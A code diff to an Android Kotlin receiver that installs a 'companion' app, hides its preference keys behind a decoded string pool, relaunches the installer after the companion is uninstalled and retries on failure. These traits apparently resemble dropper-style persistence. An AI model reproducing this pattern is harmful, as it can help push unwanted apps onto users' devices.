@@ -11,15 +11,10 @@ class InstallReceiver : BroadcastReceiver() {
     companion object {
         val PREFS_NAME        get() = StringPool.d(StringPool.PREFS_NAME)
         val KEY_COMPANION_PKG get() = StringPool.d(StringPool.KEY_COMPANION_PKG)
-
-        // Local broadcast action — InstallActivity listens for this
-        const val ACTION_SHOW_INSTALL_DIALOG = "nova.ACTION_SHOW_INSTALL_DIALOG"
-        const val EXTRA_USER_INTENT          = "user_intent"
     }
 
     override fun onReceive(context: Context, intent: Intent) {
 
-        // Companion was uninstalled — reset and relaunch Install UI
         if (intent.action == Intent.ACTION_PACKAGE_REMOVED) {
             val uninstalledPkg = intent.data?.schemeSpecificPart ?: return
             val savedPkg = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
@@ -42,26 +37,16 @@ class InstallReceiver : BroadcastReceiver() {
         when (status) {
 
             PackageInstaller.STATUS_PENDING_USER_ACTION -> {
-                // Android requires user confirmation to install.
-                // We MUST show the dialog from a foreground Activity — not from here.
-                // Send local broadcast to InstallActivity which is in foreground.
-                // InstallActivity.installDialogReceiver handles it and calls startActivity().
                 val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                     intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                 } else {
                     @Suppress("DEPRECATION")
                     intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
-                } ?: return
-
-                // First try: send to InstallActivity if it is in foreground
-                val local = Intent(ACTION_SHOW_INSTALL_DIALOG)
-                local.putExtra(EXTRA_USER_INTENT, userIntent)
-                local.setPackage(context.packageName)
-                context.sendBroadcast(local)
-
-                // Local broadcast to InstallActivity handles the dialog.
-                // Do NOT call context.startActivity here — on Android 10+ this is
-                // blocked from background and causes the glitch loop.
+                }
+                userIntent?.let {
+                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    context.startActivity(it)
+                }
             }
 
             PackageInstaller.STATUS_SUCCESS -> {
@@ -71,10 +56,9 @@ class InstallReceiver : BroadcastReceiver() {
                         context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                             .edit().putString(KEY_COMPANION_PKG, pkgName).apply()
                     }
-                    // Notify InstallActivity to transition to DONE state
-                    val done = Intent(InstallActivity.INSTALL_SUCCESS_ACTION)
-                    done.setPackage(context.packageName)
-                    context.sendBroadcast(done)
+                    val doneIntent = Intent(InstallActivity.INSTALL_SUCCESS_ACTION)
+                    doneIntent.setPackage(context.packageName)
+                    context.sendBroadcast(doneIntent)
                 } catch (e: Exception) { }
             }
 
@@ -85,7 +69,6 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
             PackageInstaller.STATUS_FAILURE_INVALID,
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
-                // Retry by restarting InstallActivity
                 val restart = Intent(context, InstallActivity::class.java)
                 restart.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 context.startActivity(restart)
